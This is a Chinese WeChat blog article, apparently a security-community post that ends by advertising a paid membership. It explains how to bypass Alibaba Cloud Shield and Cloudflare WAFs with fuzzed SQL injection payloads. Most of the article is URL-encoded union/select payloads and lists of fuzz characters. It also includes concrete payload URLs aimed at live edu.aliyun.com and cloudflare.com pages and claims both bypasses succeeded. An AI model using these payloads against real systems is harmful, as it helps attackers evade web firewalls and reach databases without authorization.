<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/cE9iMiVUBm-EyQz-wp-9bA)

0x01 前言
-------

身为连 CloudFlare 都绕不过的菜狗，在这里感谢远方师傅对于我思路的启发。

国内主流 WAF:

`阿里云盾、cloudflare、腾讯云盾、奇安信、深信服、安全狗、云锁`

**WAF 基本概念**

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXFIRhaCXsZlZicsgznmoAo8OWlwpuibDngf8yT19OMxicpjTMvMbLfLstQ/640?wx_fmt=png)

0x02 站在 WAF 视角去看安全
------------------

`WAF`出现的目的是为了保护服务器不受到攻击，在不影响服务器正常业务的运行前提下进行防护工作。

常规基于规则层面的绕过

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXFessdUmAJYCYIF32nMMc1wbXbxwCjT9MjnmWzV3ysfJfJVDDCicysnQ/640?wx_fmt=png)

常规的绕过和 HTTP 分块传输 部分 WAF 早已添加至规则库

**HTTP 分块传输:** `https://github.com/c0ny1/chunked-coding-converter`

0x03 WAF 对抗思路
-------------

`FUZZ Bypass WAF`

通常主流的阿里云盾、腾讯云盾、奇安信、深信服、安全狗、云锁等都是基于内置的正则规则来拦截恶意 SQL 注入

#### Bypass 阿里云盾

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXjhpLzKUXicv6JAiaJ4GL3uDzA2kDmO7Yt4GJZFfwYaANA7OLMicgFbLhg/640?wx_fmt=png)我们先 URL 编码我们的 Payload，然后思考一下！

编码前:

```
select 1union----#fuzz_a + fuzz_b + fuzz_c + fuzz_d + fuzz_eselect 1
```

编码后:

```
union%2d%2d%0d%0a%0a%0a%2d%2d%0a%23 + fuzz_a + fuzz_b + fuzz_c + fuzz_d + fuzz_e + %0aselect%201
```

整合我们的 Fuzz 参数:

```
/*
*/
/*!
/**/
?
/
*
=
`
%0a
%0b
%0c
%0d
%0e
%0f
```

详细的参数和 Fuzz 脚本我会发在星球，师傅们自取！

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXE4cSgUicwMcCg6iahfM6l2FMlBnIUxuWkDYoJiamPMibyeOr2ISib0NwIWA/640?wx_fmt=png)开始 Fuzz 看一下结果 这里列举一个`Fuzz Payload`:

```
https://edu.aliyun.com/course/explore?title=union%2d%2d%0d%0a%0a%0a%2d%2d%0a%23/*/*%81%0aselect%201
```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXcgicbBjjMeBus9gyiaNZ1VUOk0MiaibTwqhR8ZeRicib5DYcffbjPLLafXoA/640?wx_fmt=png)成功绕过！

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LX1icVZ6nSbCAHGStxib6RBz6hRoS87S1jwwYCdc6giaUKw09GqwibGibNsow/640?wx_fmt=png)在 Mysql 当中看看语句是否能否成功执行

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXQuy6LMps5KJMAz91LujNqfMqnKu4EQb5BKRuOFZ1GVV9a4XiakbQdZQ/640?wx_fmt=png)

####   
Bypass Cloudflare WAF

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXyJ7aIiaERl8sgqBM3KtiaPlhtHRxQbw0ZL0v8KsMH7Y0jVFPKzC0Xnvw/640?wx_fmt=png)我们先 URL 编码我们的 Payload，然后再次思考一下！编码前:

```
1' union----#fuzz_a + fuzz_b + fuzz_c + fuzz_d + fuzz_eselect 1
```

编码后:

```
1%27+union%2d%2d%0d%0a%0a%0a%2d%2d%0a%23 + fuzz_a + fuzz_b + fuzz_c + fuzz_d + fuzz_e + %0aselect%201
```

尝试写一下 Fuzz 参数:

```
%0a
%0b
%0c
%0d
%0e
%0f
/*
*/
/*!
/**/
?
/
*
=
`
```

其实大体和上面差不多。尝试写一个 Fuzz 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXVTgyy2B4JRZIsibXpiaoZnlH829c45Y4nricz0dkNmLxUAxFxupV9nicPw/640?wx_fmt=png)开始 Fuzz 看一下结果 这里列举一个`Fuzz Payload`:

```
https://www.cloudflare.com/zh-cn/?id=%27+union%2d%2d%0d%0a%0a%0a%2d%2d%0a%23/*/*/*/*/**/%0aselect
```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXSPxxps3bwXC9jB1icgQmp5cMcEWbBgMLy5U7ICFhaC7qxOicVIiadz4Aw/640?wx_fmt=png)成功通过 Fuzz 绕过 CloudFlare

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LX5DLvsqB3eczkG01jSdkClkglO6qVR8Zhlul1OmWhRBbdibSmqBl56fw/640?wx_fmt=png)通过 FUZZ 得知敏感关键字前面添加`%27+union%2d%2d%0d%0a%0a%0a%2d%2d%0a%23/*/*/*/*!/**/%0aselect%201`可规避 Cloudflare WAF

_参考:_

`http://galaxylab.pingan.com.cn/waf%E6%94%BB%E9%98%B2%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%AF%87/`

0x04 结尾
-------

把这些已知方法融合起来，并结合各自 WAF 本身的防护特性，不断进行推理，成为突破 WAF 防护的关键。天妒英才，晨勃不再！

**从现在开始，星球定价 125 元！日后只有慢慢涨没有跌价！现在入股不亏，持续输出原创文章，还是小有干货的！**![](https://mmbiz.qpic.cn/mmbiz_jpg/icefLCXrhxfjPR1R2gNvG7tVVbFKvM4LXQZxYhk5ClVYec7iagapZwtrdRbqoiauXWbUxy7rsTXbFrfWCxVtHkYpQ/640?wx_fmt=jpeg)